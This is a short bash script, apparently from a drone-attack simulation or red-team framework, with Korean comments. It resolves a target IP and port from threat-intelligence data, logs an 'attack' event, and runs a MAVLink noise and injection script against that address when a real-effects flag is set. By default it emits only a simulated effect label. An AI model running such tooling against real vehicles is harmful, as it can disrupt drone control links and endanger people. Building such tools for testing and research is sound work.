#!/usr/bin/env bash
# CTI로 최신 IP/Port를 resolve해서 MAVLink 노이즈/주입 재실행
set -euo pipefail
BASE="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
. "$BASE/00_env.sh"; . "$BASE/sh_core/lpc_bus.sh"; . "$BASE/cti/cti_store.sh"

: "${COUNT:=300}"
: "${SLEEP_MS:=10}"

main(){
  cti_resolve >/dev/null
  bus_emit "attack" "type=follow_mavlink ip=$CURRENT_IP port=$CURRENT_PORT count=$COUNT sleep_ms=$SLEEP_MS"
  if [ "${ALLOW_REAL_EFFECTS:-0}" -eq 1 ]; then
    python3 "$BASE/interface/mavlink_noise.py" --host "$CURRENT_IP" --port "$CURRENT_PORT" \
      --count "$COUNT" --sleep-ms "$SLEEP_MS" || true
  fi
  # 최소 영향 라벨(시뮬 모드/측정용)
  effect_emit "jitter_ms=1"
}
main "$@"
